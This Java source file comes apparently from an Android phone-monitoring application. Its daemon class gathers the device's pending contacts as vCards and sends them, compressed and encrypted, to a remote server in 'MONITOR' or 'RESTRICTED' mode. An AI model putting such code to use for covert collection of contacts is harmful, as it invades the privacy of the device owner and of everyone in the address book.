package com.vvt.daemon_addressbook_manager.delivery;

import java.util.List;

import android.content.Context;

import com.vvt.base.FxAddressbookMode;
import com.vvt.daemon_addressbook_manager.Customization;
import com.vvt.datadeliverymanager.DeliveryRequest;
import com.vvt.datadeliverymanager.enums.DataProviderType;
import com.vvt.datadeliverymanager.enums.DeliveryRequestType;
import com.vvt.datadeliverymanager.enums.PriorityRequest;
import com.vvt.datadeliverymanager.interfaces.DataDelivery;
import com.vvt.datadeliverymanager.interfaces.DeliveryListener;
import com.vvt.logger.FxLog;
import com.vvt.phoenix.prot.command.CommandData;
import com.vvt.phoenix.prot.command.GetAddressBook;
import com.vvt.phoenix.prot.command.SendAddrBookForApproval;
import com.vvt.phoenix.prot.command.SendAddressBook;
import com.vvt.phoenix.prot.event.AddressBook;
import com.vvt.processaddressbookmanager.repository.AddressbookRepository;
 

/**
 * @author Aruna
 * @version 1.0
 * @created 07-Oct-2011 03:23:38
 */
public class AddressbookDeliveryManager {
	private static final String TAG = "AddressbookDeliveryManager";
	private static final boolean LOGV = Customization.VERBOSE;
	private static final boolean LOGD = Customization.DEBUG;
	@SuppressWarnings("unused")
	private static final boolean LOGE = Customization.ERROR;
	
	private int mCallerId = 2;
	private DataDelivery mDataDelivery;
	private AddressbookRepository mAddressbookRepository;
	private enum DeliverRequestType { GET_ADDRESSBOOK, SEND_ADDRESSBOOK, SEND_ADDRESSBOOK_FOR_APPROVAL 	}
	private DeliveryListener mDeliveryListener;
	private Context mContext;
	
	public AddressbookDeliveryManager(int callerId, Context context){
		mCallerId = callerId;
		mContext = context;
	}

	public void getAddressbook(){
		deliverRequest(DeliverRequestType.GET_ADDRESSBOOK, null);
	}

	public void sendAddressbook(){
		if(LOGV) FxLog.v(TAG, "sendAddressbook # START ..");
		deliverRequest(DeliverRequestType.SEND_ADDRESSBOOK, FxAddressbookMode.MONITOR);
		if(LOGV) FxLog.v(TAG, "sendAddressbook # EXIT ..");
	}
	
	public void sendAddressbookForApproval(){
		deliverRequest(DeliverRequestType.SEND_ADDRESSBOOK_FOR_APPROVAL, FxAddressbookMode.RESTRICTED);
	}
 
	public void setDataDelivery(DataDelivery dataDelivery){
		mDataDelivery = dataDelivery;
	}

	public void setAddressbookRepository(AddressbookRepository addressbookRepository){
		mAddressbookRepository = addressbookRepository;
	}
 
	public void setDeliveryListener(DeliveryListener deliveryListener){
		mDeliveryListener = deliveryListener;
	}
	
	private void deliverRequest(DeliverRequestType deliverRequestType, FxAddressbookMode mode) {
		CommandData commandData = null;
		
		if(deliverRequestType == DeliverRequestType.GET_ADDRESSBOOK) {
			commandData = new GetAddressBook();
		}
		else { 
			commandData = getCommandData(deliverRequestType, mode);
		}
		
		// Construct Request
		DeliveryRequest request = constructRequest(commandData);
		request.setDeliveryListener(mDeliveryListener);
		
		mDataDelivery.deliver(request);
		if(LOGD) FxLog.v(TAG, "handleRequest # A new request is sent to DDM");
		
	}	

	/**
	 * Construct SendAddrBookForApproval or SendAddressBook  command data
	 * @return
	 */
	private CommandData getCommandData(DeliverRequestType deliverRequestType, FxAddressbookMode mode) {
		List<KeyValuePair<Long, Long>> list = null; 
		AddressBook book = new AddressBook();
		book.setAddressBookId(1);
		book.setAddressBookName("AndroidBook");
		
		list = mAddressbookRepository.getPendingContactIds();
		book.setVCardProvider(new AddressbookProvider(list, mAddressbookRepository, mode, mContext));
		book.setVCardCount(list.size());
		
		if(deliverRequestType == DeliverRequestType.SEND_ADDRESSBOOK_FOR_APPROVAL) {
			SendAddrBookForApproval commandData = new SendAddrBookForApproval();
			commandData.setAddressBook(book);
			return commandData;
		}
		else {
			SendAddressBook commandData = new SendAddressBook();
			commandData.addAddressBook(book);
			return commandData;
		}
	}

	
	/**
	 * Creates a delivery request
	 * @param commandData
	 * @return A delivery request
	 */
	private DeliveryRequest constructRequest(CommandData commandData) {
		DeliveryRequest request = new DeliveryRequest();
		request.setCallerID(mCallerId);
		request.setCommandData(commandData);
		request.setDeliveryRequestType(DeliveryRequestType.REQUEST_TYPE_NEW);
		request.setRequestPriority(PriorityRequest.PRIORITY_NORMAL);
		request.setDataProviderType(DataProviderType.DATA_PROVIDER_TYPE_NONE);
		request.setMaxRetryCount(getMaxRetryCount());
		request.setDelayTime(getRetryDelay());
		request.setIsRequireCompression(true);
		request.setIsRequireEncryption(true);
		return request;
	}
	
	/***
	 * Retry delay time
	 * @return
	 */
	private long getRetryDelay() {
		return 10 * 60 * 1000;
	}
	
	/**
	 * Retry count
	 * @return
	 */
	private int getMaxRetryCount() {
		return 1;
	}

	
}